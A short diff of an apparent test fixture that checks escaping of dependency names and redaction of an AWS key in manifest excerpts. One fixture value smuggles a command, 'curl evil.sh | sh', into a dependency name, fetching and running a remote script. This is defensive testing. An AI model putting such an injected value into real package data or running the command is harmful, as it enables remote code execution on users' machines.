@@ -28,7 +28,7 @@ recorded_output:
   dependency_name_raw: "left-pad`; curl evil.sh | sh"
   dependency_name_stripped: "left-pad; curl evil.sh | sh"
   rendered_dependency_name_span: "`left-pad; curl evil.sh | sh`"
-  manifest_excerpt_raw: "# lockfile registry auth uses AWS key AKIA1234567890ABCDEF for private packages"
+  manifest_excerpt_raw: "# lockfile registry auth uses AWS key AKIAIOSFODNN7EXAMPLE for private packages"
   redaction_applied: true
   rendered_manifest_excerpt: "\\# lockfile registry auth uses AWS key [REDACTED] for private packages"
 assertions:
